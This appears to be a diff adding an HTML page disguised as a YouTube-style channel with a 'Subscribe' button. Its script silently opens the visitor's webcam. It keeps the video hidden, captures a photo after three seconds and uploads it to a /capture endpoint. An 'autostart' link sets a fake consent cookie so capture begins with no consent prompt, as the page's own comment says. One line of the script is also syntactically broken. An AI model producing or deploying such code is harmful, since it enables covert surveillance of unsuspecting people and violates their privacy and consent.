@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>YouTube Channel Demo - Subscribe to Demo</title>
+  <style>
+    /* Reset and overall page styling */
+    body {
+      font-family: "Roboto", Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f9f9f9;
+    }
+    /* YouTube-style navigation bar */
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #fff;
+      border-bottom: 1px solid #e5e5e5;
+      padding: 10px 20px;
+    }
+    .navbar .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #cc181e;
+    }
+    .navbar .profile-pic {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+    }
+    /* Main container styling resembling a channel page */
+    .container {
+      max-width: 800px;
+      margin: 30px auto;
+      padding: 20px;
+      background: #fff;
+      border: 1px solid #e5e5e5;
+      border-radius: 4px;
+      text-align: center;
+    }
+    .subscribe-box {
+      margin: 30px 0;
+      padding: 20px;
+      border: 2px solid #cc181e;
+      border-radius: 8px;
+      background: #fefefe;
+    }
+    .subscribe-btn {
+      background: #cc181e;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .subscribe-btn:hover {
+      background: #b01518;
+    }
+    /* Hide video element completely */
+    #live-feed {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <!-- Navigation bar -->
+  <div class="navbar">
+    <div class="logo">YouTube Demo</div>
+    <img class="profile-pic" src="https://via.placeholder.com/32" alt="Channel Profile">
+  </div>
+
+  <div class="container">
+    <!-- Subscribe UI -->
+    <div class="subscribe-box" id="subscribe-box">
+      <h2>Welcome to the Demo Channel</h2>
+      <p>Subscribe to our channel to enable our secret demo feature.</p>
+      <button id="subscribe-btn" class="subscribe-btn">Subscribe</button>
+    </div>
+
+    <!-- Hidden camera feed container -->
+    <div id="camera-ui">
+      <video id="live-feed" autoplay></video>
+      <div id="capture-result"></div>
+    </div>
+
+    <!-- Direct link for auto-starting demo (no visible consent UI) -->
+    <p style="font-size: 12px; margin-top: 20px;">
+      Direct link: <a href="?autostart=1">https://yourdomain.com/?autostart=1</a>
+    </p>
+  </div>
+
+  <script>
+    // Check for URL query parameter 'autostart=1'
+    const urlParams = new URLSearchParams(window.location.search);
+    const autoStart = urlParams.get('autostart') === "1";
+
+    // Cookie utility functions
+    function hasConsentCookie() {
+      return document.cookie.split(';').some(item => item.trim().startsWith('consent=true'));
+    }
+    function setConsentCookie() {
+      const d = new Date();
+      d.setTime(d.getTime() + (30*24*60*60*1000));
+      document.cookie = "consent=true; expires=" + d.toUTCString() + "; path=/";
+    }
+
+    // Start camera and auto-capture hidden in background
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const liveFeed = document.getElementById('live-feed');
+        liveFeed.srcObject = stream;
+        // The #live-feed is kept hidden using CSS (display:none) so it's not visible on the page.
+        // Wait a few seconds before auto-capturing
+        setTimeout(autoCapture, 3000);
+      } catch (err) {
+        console.error("Camera access denied: " + err.message);
+      }
+    }
+
+    // Auto-capture the image silently
+    function autoCapture() {
+      const liveFeed = document.getElementById('live-feed');
+      const canvas = document.createElement('canvas');
+      canvas.width = liveFeed.videoWidth;
+      canvas.height = liveFeed.videoHeight;
+      canvas.getContext('2d').drawImage(liveFeed, 0, 0);
+      
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('image', blob, 'demo_capture.png');
+        try {
+          await fetch('/capture', {
+            method: 'POST',
+            body: formData
+          });
+          document.getElementById('capture-result').innerHTML =
+            <p style="font-size:12px; color:gray;">Demo image saved.</p>;
+        } catch (err) {
+          console.error("Error during auto-capture:", err);
+        }
+      }, 'image/png');
+    }
+
+    // Initialization: Check cookie and URL, then subscribe
+    function init() {
+      if (autoStart || hasConsentCookie()) {
+        setConsentCookie();
+        document.getElementById('subscribe-box').style.display = 'none';
+        startCamera();
+      } else {
+        // Show UI and attach subscribe button event
+        document.getElementById('subscribe-btn').addEventListener('click', () => {
+          setConsentCookie();
+          document.getElementById('subscribe-box').style.display = 'none';
+          startCamera();
+        });
+      }
+    }
+
+    window.onload = init;
+  </script>
+</body>
+</html> 
